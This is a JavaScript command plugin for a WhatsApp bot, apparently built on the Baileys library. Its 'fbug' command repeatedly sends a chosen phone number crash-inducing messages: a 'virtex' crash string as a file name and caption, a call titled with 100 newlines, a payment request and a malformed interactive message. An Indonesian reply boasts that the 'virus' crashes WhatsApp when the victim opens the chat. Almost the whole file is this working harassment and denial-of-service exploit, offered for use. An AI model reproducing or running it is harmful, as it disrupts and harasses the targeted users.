import {xeontext1} from "../../lib/virtex.js"
import fs from 'fs-extra'
let handler = async (m, { q, conn, text, command }) => {


if (!q) throw `*Jangan salah gunakan om yah*\n\nExample: ${command} 628XXXXXX/10`
let num = q.split("|")[0].startsWith('+')? q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : q.split("|")[0]
log(num)
let jumlah = text.split('|')[1]

await m.reply(wait)
 
const fbug = {
  "key": { 
    "fromMe": false,
    "participant": '0@s.whatsapp.net',
    "remoteJid": 'status@broadcast' 
  },
  message: {
    "listResponseMessage": {
      title: `bokep`
    }
  }
};











for (let i = 0; i < jumlah; i++) {
  setTimeout(async () => { 
await conn.sendMessage(num, {
document: fs.readFileSync(`./media/thumbnaildokumen.jpg`),
mimetype: `image/null`,
fileName: `${xeontext1}` ,
caption: `${xeontext1}`,
}, 
{quoted: fbug })




let sok = new Date();
await conn.relayMessage(
  num,
  {
    scheduledCallCreationMessage: {
      callType: 1,
      scheduledTimestampMs: sok.getTime(),
      title: "\n".repeat(100),
    },
  },
  {}
);
const { proto, generateWAMessageFromContent } = require("baileys");
 

let requestPaymentMessage = generateWAMessageFromContent(
  num,
  proto.Message.fromObject({
    requestPaymentMessage: {
      currencyCodeIso4217: "IDR",
      amount1000: "1000",
      extendedTextMessage: {
        text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61",
      },
    },
  }),
  { userJid: num }
);
await conn.relayMessage(num, requestPaymentMessage.message, {
  messageId: requestPaymentMessage.key.id,
})




let msg = generateWAMessageFromContent(num, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "test"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "test"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "test",
            subtitle: "test",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [              
              {
                 "name": "cta_copy",
                 "buttonParamsJson": "{\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\${me}\}"
              }
           ],
          })
        })
    }
  }
}, {})

await conn.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})





  }, i * 3000); // Delay setiap pengiriman selama 5 detik (5000 milidetik)
}
m.reply(`Sukses Mengirim ${command}\nKe Nomor: ${q} sebanyak ${text}\n\n*Note :* Virus ini aktif ketika korban membuka chat nya, maka WhatsApp akan crash hehe`)
}
//handler.help = ['fbug <nomer/jumlah>']
//handler.tags = ['tools']
handler.command =['fbug','haloo']
handler.owner = true 
export default handler